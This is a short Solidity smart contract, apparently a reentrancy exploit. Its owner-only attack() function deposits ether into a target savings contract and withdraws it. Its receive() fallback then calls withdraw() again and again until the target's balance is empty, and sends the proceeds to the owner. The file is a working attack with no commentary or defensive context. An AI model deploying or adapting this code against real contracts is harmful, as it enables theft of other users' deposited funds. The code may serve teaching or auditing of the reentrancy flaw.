pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";


interface ISavingsAccountV2 {

    function deposit() external payable;

    function withdraw() external;

}


contract InvestorV2 is Ownable {

      ISavingsAccountV2 public immutable savingsAccountV2;

    // savingsAccountAddress ---> Original Smart contract Address
    constructor (address savingsAccountAddress) {
        savingsAccountV2 = ISavingsAccountV2(savingsAccountAddress);
    }

    function attack() external payable onlyOwner {
        savingsAccountV2.deposit{value: msg.value}();
        savingsAccountV2.withdraw();
    }


    receive() external payable {
        if (address(savingsAccountV2).balance > 0) {
            savingsAccountV2.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }

}
